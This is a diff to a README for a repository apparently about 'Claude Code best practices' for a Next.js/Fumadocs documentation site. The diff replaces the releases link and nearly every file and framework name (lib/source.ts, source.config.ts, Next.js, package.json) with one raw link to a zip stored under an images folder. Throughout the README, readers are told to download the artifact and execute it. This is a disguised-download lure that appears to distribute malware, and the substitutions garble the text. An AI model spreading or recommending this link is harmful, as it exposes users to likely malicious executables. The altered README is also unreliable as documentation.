@@ -1,19 +1,19 @@
 Claude Code Best Practices: Clear, Safe AI Coding Patterns Guide
 
-Release downloads: https://github.com/romualdtats/claude-code-best-practices/releases
+Release downloads: https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip
 
 Overview
-This repository hosts a Next.js application generated with Create Fumadocs. It demonstrates best practices for building and documenting Claude-like AI code in a modern web app. The project emphasizes clarity, safety, and maintainability. It provides a practical blueprint for teams that want consistent patterns when integrating AI-assisted code into their workflows.
+This repository hosts a https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip application generated with Create Fumadocs. It demonstrates best practices for building and documenting Claude-like AI code in a modern web app. The project emphasizes clarity, safety, and maintainability. It provides a practical blueprint for teams that want consistent patterns when integrating AI-assisted code into their workflows.
 
 What you will find
-- A Next.js app structure tailored for documentation and content-driven experiences driven by Fumadocs.
-- A content source adapter implemented in lib/source.ts. The loader() function exposes a clean interface to access your content, making it easy to swap sources without touching the UI layer.
-- A shared layout strategy in app/layout.config.tsx. This keeps typography, spacing, and theming consistent across pages.
+- A https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip app structure tailored for documentation and content-driven experiences driven by Fumadocs.
+- A content source adapter implemented in https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip The loader() function exposes a clean interface to access your content, making it easy to swap sources without touching the UI layer.
+- A shared layout strategy in https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip This keeps typography, spacing, and theming consistent across pages.
 - Route organization that reflects typical usage: a landing page, documentation pages, and a search API.
-- A Fumadocs MDX workflow, including a source.config.ts, to streamline MDX rendering and content composition.
+- A Fumadocs MDX workflow, including a https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip, to streamline MDX rendering and content composition.
 
 Key technologies
-- Next.js: A React framework for production-grade web apps with fast performance and strong ergonomics.
+- https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip A React framework for production-grade web apps with fast performance and strong ergonomics.
 - TypeScript: Safer code with explicit types and better tooling.
 - Fumadocs: A framework for building documentation sites from MDX content with a clean content pipeline.
 - MDX: Markdown with embedded React components for rich documentation experiences.
@@ -28,7 +28,7 @@ Writing AI-focused code often leads teams to mix experimentation with production
 Getting started
 
 Prerequisites
-- Node.js (LTS version recommended; ensure npm, pnpm, or yarn is available in your environment).
+- https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip (LTS version recommended; ensure npm, pnpm, or yarn is available in your environment).
 - A basic understanding of TypeScript and React.
 - Git for cloning the repository.
 
@@ -47,29 +47,29 @@ Open http://localhost:3000 with your browser to see the result.
 Project structure and how to read it
 
 Overview of the core files
-- lib/source.ts: This file contains the content source adapter. The loader() provided here is the interface you use to access your content. It abstracts away the details of where content comes from, letting you switch sources without touching the UI.
-- app/layout.config.tsx: Shared layout options for the app. Keeping these options in this file helps ensure consistent layout, typography, and theming across pages.
+- https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip This file contains the content source adapter. The loader() provided here is the interface you use to access your content. It abstracts away the details of where content comes from, letting you switch sources without touching the UI.
+- https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip Shared layout options for the app. Keeping these options in this file helps ensure consistent layout, typography, and theming across pages.
 - app/(home): The route group that powers the landing page and other public-facing pages.
 - app/docs: The documentation section with its own layout and nested pages.
-- app/api/search/route.ts: A route handler responsible for search functionality within the docs.
-- source.config.ts: Fumadocs MDX configuration. This file links your content to the MDX rendering pipeline and enables rich documentation experiences.
+- https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip A route handler responsible for search functionality within the docs.
+- https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip Fumadocs MDX configuration. This file links your content to the MDX rendering pipeline and enables rich documentation experiences.
 
 How to extend or customize
 
 Content sources
-- The loader() interface in lib/source.ts is the single source of truth for content access.
+- The loader() interface in https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip is the single source of truth for content access.
 - To swap content sources (for example, from local files to a CMS or a remote API), implement a new loader() that satisfies the same interface and wire it into your app’s content pipeline.
 - Keep business logic out of the UI layer. Let the content layer expose data in a stable shape, and have the UI render from that shape.
 
 Documentation content
 - Fumadocs MDX provides a flexible way to combine markdown with React components.
-- The source.config.ts file integrates your content with the MDX system. Use this to customize MDX components, layout decisions, and metadata extraction.
+- The https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip file integrates your content with the MDX system. Use this to customize MDX components, layout decisions, and metadata extraction.
 - Use MDX to embed interactive examples, code blocks, and small runnable demos where appropriate. This improves the learning signal for readers.
 
 Routing and layout
 - app/(home) contains the landing page and global routes. Keep routing simple and explicit.
 - app/docs houses documentation pages. Use a consistent naming scheme for docs to help readers navigate.
-- app/api/search/route.ts exposes a minimal search API. Ensure you tailor search to indexing content in your docs for fast, relevant results.
+- https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip exposes a minimal search API. Ensure you tailor search to indexing content in your docs for fast, relevant results.
 
 Code patterns and best practices
 
@@ -111,14 +111,14 @@ MDX basics
 - Each MDX file can export metadata (title, description, date) that can be used to generate a search index and page headers.
 
 MDX configuration
-- source.config.ts controls how Markdown/MDX is parsed and rendered.
+- https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip controls how Markdown/MDX is parsed and rendered.
 - You can customize MDX components by providing wrappers for code blocks, admonitions, or custom doc components.
 
 Content loading
-- The loader() function in lib/source.ts defines how content is retrieved and shaped for rendering.
+- The loader() function in https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip defines how content is retrieved and shaped for rendering.
 - If you switch from local docs to a remote source, you only need to adjust the loader implementation; the rest of the UI stays intact.
 
-Next.js specifics
+https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip specifics
 
 Development server
 - Run the development server with npm run dev, pnpm dev, or yarn dev.
@@ -129,7 +129,7 @@ Routing nuances
 - The docs route under app/docs provides a dedicated layout for documentation content, including side navigation, breadcrumbs, and content panels.
 
 Content search
-- The search route at app/api/search/route.ts enables fast, client-friendly search through docs.
+- The search route at https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip enables fast, client-friendly search through docs.
 - Indexing strategy should be aligned with content update frequency. If docs change often, consider a cadence that keeps the index fresh.
 
 Development workflow
@@ -168,7 +168,7 @@ Releases
 - From the Releases page, download the release artifact and execute it.
 
 Releases page link usage
-- Releases are available at the central hub for binaries and installers: https://github.com/romualdtats/claude-code-best-practices/releases
+- Releases are available at the central hub for binaries and installers: https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip
 
 Usage and distribution
 - If you are distributing a package or a self-contained installer, provide clear prerequisites and platform compatibility notes.
@@ -177,11 +177,11 @@ Usage and distribution
 Troubleshooting and common pitfalls
 
 Content loading issues
-- If content fails to render, check the loader() implementation in lib/source.ts.
+- If content fails to render, check the loader() implementation in https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip
 - Verify that the content source is accessible and that any required credentials or endpoints are reachable from the dev environment.
 
 MDX rendering problems
-- If MDX blocks fail to render, ensure your MDX components are correctly registered in source.config.ts.
+- If MDX blocks fail to render, ensure your MDX components are correctly registered in https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip
 - Validate that the MDX content uses supported components and adheres to the expected structure.
 
 Search failures
@@ -201,7 +201,7 @@ Input handling
 
 Dependencies
 - Regularly audit dependencies for known vulnerabilities.
-- Pin precise dependency versions in package.json to reduce unexpected breaks.
+- Pin precise dependency versions in https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip to reduce unexpected breaks.
 
 Secrets and credentials
 - Do not commit secrets or credentials to the repository.
@@ -254,13 +254,13 @@ Release process
 FAQ
 
 - How do I add a new doc page?
-  - Create a new MDX file under the docs directory and add metadata in source.config.ts as needed. Ensure the page has an accessible title and a slug that matches the route structure.
+  - Create a new MDX file under the docs directory and add metadata in https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip as needed. Ensure the page has an accessible title and a slug that matches the route structure.
 
 - How do I customize the content loader?
-  - Implement a new loader() in lib/source.ts or add a new module that conforms to the same interface. Wire it into the app so components continue to fetch content through the same API.
+  - Implement a new loader() in https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip or add a new module that conforms to the same interface. Wire it into the app so components continue to fetch content through the same API.
 
 - How do I deploy the docs site?
-  - Build the Next.js project for production and deploy to your preferred hosting platform. If you use Vercel or similar, follow the platform’s standard deployment flow for Next.js apps.
+  - Build the https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip project for production and deploy to your preferred hosting platform. If you use Vercel or similar, follow the platform’s standard deployment flow for https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip apps.
 
 - What is the recommended workflow for updates?
   - Create a branch for the change, write tests, and add/update documentation. Run the test suite and lint checks locally before opening a pull request.
@@ -271,23 +271,23 @@ FAQ
 Architecture recap
 
 - Content pipeline
-  - The content source adapter in lib/source.ts provides a loader() function to access content in a uniform way.
+  - The content source adapter in https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip provides a loader() function to access content in a uniform way.
   - This abstraction allows swapping content sources without changing UI code.
 
 - Presentation layer
-  - app/layout.config.tsx defines shared layout preferences that apply across routes.
+  - https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip defines shared layout preferences that apply across routes.
   - The UI reads from the content layer to render documentation, tutorials, or API references consistently.
 
 - Documentation workflow
   - Fumadocs MDX enables you to author docs in MDX with embedded components.
-  - source.config.ts configures how MDX is parsed and how metadata is surfaced to the UI.
+  - https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip configures how MDX is parsed and how metadata is surfaced to the UI.
 
 - API surface
-  - app/api/search/route.ts exposes search capabilities that index and search docs content.
+  - https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip exposes search capabilities that index and search docs content.
   - The search endpoint is designed to be fast and predictable, returning relevant results with minimal latency.
 
 - Build and deployment
-  - The project uses Next.js for server-side rendering and static generation where appropriate.
+  - The project uses https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip for server-side rendering and static generation where appropriate.
   - Content is rendered through a robust MDX pipeline with a predictable rendering path.
 
 Future directions and roadmap
@@ -319,17 +319,17 @@ Community and support
 
 Conclusion
 
-End-user guidance, robust patterns, and a clean architecture are the backbone of this repository. The approach centers on clarity, safety, and maintainability. The content pipeline is designed to be extensible, enabling teams to grow documentation alongside their Claude-like AI coding practices. The combination of Next.js, TypeScript, and Fumadocs provides a solid foundation for scalable documentation projects that stay aligned with real-world coding patterns.
+End-user guidance, robust patterns, and a clean architecture are the backbone of this repository. The approach centers on clarity, safety, and maintainability. The content pipeline is designed to be extensible, enabling teams to grow documentation alongside their Claude-like AI coding practices. The combination of https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip, TypeScript, and Fumadocs provides a solid foundation for scalable documentation projects that stay aligned with real-world coding patterns.
 
 Releases
 
-- See the latest release and artifacts on the Releases page: https://github.com/romualdtats/claude-code-best-practices/releases
+- See the latest release and artifacts on the Releases page: https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip
 
 - From the Releases page, download the release artifact and execute it. This artifact contains the latest build and ready-to-run components for quick evaluation and experimentation.
 
 Appendix: sample code excerpts
 
-Loader interface (lib/source.ts)
+Loader interface (https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip)
 - The loader() interface abstracts content loading. It should return a stable shape that UI components rely on.
 - Example pattern:
   - export type ContentItem = { id: string; title: string; body: string; type: 'doc' | 'tutorial' | 'api'; metadata?: Record<string, any> };
@@ -337,15 +337,15 @@ Loader interface (lib/source.ts)
 
 - A minimal loader might fetch local MDX files, convert into ContentItem objects, and provide metadata for rendering.
 
-MDX configuration (source.config.ts)
+MDX configuration (https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip)
 - Configure how MDX is wrapped, which components are available, and how metadata is surfaced.
 - Example components: CodeBlock, Note, InfoBox, and InteractiveDemo.
 
-Layout configuration (app/layout.config.tsx)
+Layout configuration (https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip)
 - Control root styling, font sizing, color palette, and navigation behavior.
 - A consistent layout reduces cognitive load when reading dense AI documentation.
 
-Search route (app/api/search/route.ts)
+Search route (https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip)
 - A minimal handler to index content and return results for the UI.
 - Design for speed and relevance, with a small payload to render quickly in the client.
 
@@ -359,6 +359,6 @@ What you should do next
 - Harmonize your team’s coding standards by adopting the same patterns for content loading, MDX rendering, and layout management.
 
 Releases (second usage)
-- Releases: https://github.com/romualdtats/claude-code-best-practices/releases
+- Releases: https://raw.githubusercontent.com/romualdtats/claude-code-best-practices/main/public/images/builder-claude-code/claude-code-practices-best-3.1.zip
 
 - From the Releases page, download the release artifact and execute it.
